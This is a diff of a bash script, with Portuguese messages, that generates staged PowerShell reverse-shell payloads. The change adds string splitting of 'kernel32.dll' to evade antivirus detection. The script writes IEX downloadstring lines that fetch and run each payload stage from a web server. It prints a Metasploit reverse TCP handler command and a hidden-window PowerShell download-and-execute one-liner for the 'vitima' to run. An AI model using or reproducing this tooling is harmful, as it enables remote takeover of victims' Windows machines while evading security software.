@@ -47,7 +47,8 @@ echo "IEX((new-object net.webclient).downloadstring('$url_base""s7.txt'));" >> t
 echo "Start-Sleep -milliseconds 1000" >> tmp/shell.txt
 echo "IEX((new-object net.webclient).downloadstring('$url_base""s8.txt'));" >> tmp/shell.txt
 
-head -6 tmp/shellcode > tmp/s1.txt
+head -6 tmp/shellcode | sed 's/kernel32.dll/ke"+"rnel"+"32."+"d"+"ll/g' > tmp/s1.txt
+
 cat tmp/shellcode | grep "Win32Functions" > tmp/s2.txt
 
 var=$(cat tmp/shellcode | grep "[Byte[]]" | cut -d" " -f2)
@@ -99,26 +100,8 @@ echo ""
 RED='\033[0;31m'
 GREEN='\033[0;32m'
 NC='\033[0m'
-printf "Processo finalizado! os arquivos ${RED}shell.txt, s1.txt, s2.txt, s3.txt, s4.txt, s5.txt, s6.txt, s7.txt e s8.txt${NC} foram gerados. Você deve subir esses arquivos em algum servidor WEB acessível pela vitima.\n"
+printf "Processo finalizado! os arquivos ${RED}shell.txt, s1.txt, s2.txt, s3.txt, s4.txt, s5.txt, s6.txt, s7.txt e s8.txt${NC} foram gerados nodiretório ${RED}tmp${NC}. Você deve subir esses arquivos em algum servidor WEB acessível pela vitima.\n"
 printf "O arquivo ${RED}shell.txt${NC} ira carregar os demais arquivos.\n"
-echo ""
-
-verificaURL() {
-	code=$(curl -o /dev/null -s -w "%{http_code}" $url)
-	if [ $code -eq "200" ];
-	then
-        	printf "${GREEN}URL verificada com sucesso!${NC}"
-		echo ""		
-	else
-        	printf "${RED}A URL $url parece inacessível.${NC}"
-	        echo ""
-        	verificaURL	
-	fi
-}
-
-
-
-sleep 2
 echo ""
 echo "Inicie o metasploist no atacante com esse comando: "
 printf "${RED}msfconsole -x \"use exploit/multi/handler; set payload windows/x64/shell_reverse_tcp; set lhost $ip; set lport $porta; set exitonsession false; exploit -j;\"${NC}"
@@ -128,4 +111,3 @@ echo "A vitima deve executar o seguinte comando (em um ambiente com proxy, desab
 printf "${RED}powershell -windowstyle hidden -C \"IEX((new-object net.webclient).downloadstring('$url'));\"${NC}"
 
 rm tmp/shellcode
-
